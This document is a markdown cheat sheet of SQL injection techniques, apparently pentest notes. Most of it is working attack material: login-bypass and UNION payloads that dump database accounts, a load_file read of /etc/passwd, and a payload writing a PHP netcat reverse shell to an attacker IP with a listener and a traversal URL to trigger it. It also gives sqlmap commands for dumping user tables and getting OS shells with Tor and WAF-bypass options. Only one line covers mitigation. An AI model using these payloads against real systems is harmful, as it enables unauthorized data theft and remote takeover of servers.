# SQL Injection

## Types
- MySQL
  - Error Based
    - ```'``` & ```"``` & ```\``` & ```)``` & tilda
  - Blind 
    - Boolean
      - True: ```id=1" and 1=1--```
      - False: ```id=1" and 1=2--```
      - Other
        - ```id=1' and 1=1--+```
        - ```id=1' and 1=1#```  
    - Time Based
      - ```id=1' and sleep(5)--```
      - ```id=';waitfor delay '0:0:5'--```

## Payloads
```
a' or '1'='1
a' or '1'='1'%23
a' or 1=1%23
a'%09or%09'1'='1
a'or'1'='1
a'/**/or/**/'1'='1
2 or 1=1
2%0Aor 1=1
` desc %23
IF(0,name,age)
' or 1=1#
' or 1=1--
' or 1=1 LIMIT 1 #
2 union all select * from users
```

## Tips
- True statement: ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1```
- False statement: ```dNd 0=1``` & ```anD 9=2``` & ```ordEr bY 1000000000000```
- Space: ```+``` & ```/**/``` & ```%20```
- Comment: ```/*``` & ```//``` & ```;//``` & ```#``` & ```%23```

## Exploit
- Login
  - username: ```admin'#``` 
  - password: ```1' or 1=1#``` 

- Data Extracting 
  - Seleting database version, Database, user
    - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
  - Database tables 
    - ```... union select 1,table_name,null,null,5 from information_schema.tables``` 
    - ```... union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'``` 
  - Table Columns
    - ```... union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
  - Selecting data from table 
    - ```... union select 1,username,password,is_admin,5 from accounts``` 
  - Reading files
    - ```... union select null,load_file('/etc/passwd'),null,null,null``` 
  - Writing files
    - ```UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*``` 

- Shell upload 
  - Payload 
    - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
  - Listen on attacker machin:
    - nc -vv -l -p 8080
  - Run backdoor
    - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```

## Mitigation
- Use parametrized statements, separate data from sql code


## SQLMAP
- Commands
  - ```sqlmap --help```
  - ```sqlmap -u [target url]```
  - ```sqlmap -u [target url] --os-shell```
  - ```sqlmap -u [target url] --sql-shell```

- Login page
```
sqlmap -u https://admin-portal.htb/login.php --form --dbs
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass"
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" --dbs
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin --tables
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --columns
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --dump
```

- Advanced Switches
  - Level
    - ```--dbs --level 5```
  - Risk
    - ```--risk 3```
  - POST 
    - ```sqlmap -u “http://testfire.net/login.jsp” --form --dbs``` 
  - Technique
    - ```techniques=B --dbs```
    - ```B``` => Blind Boolean
    - ```T``` => Blind Time-based
    - ```E``` => Error-based
    - ```U``` => Union
  - Tor
    - ```--tor```
  - Shell
    - ```sqlmap -u “...” --sql-shell```
    - ```sqlmap -u “...” --os-shell```
  - WAF Bypass 
    - Path: /usr/share/sqlmap/tamper 
    - ```--tamper=space2dash, hex2char --dbs```
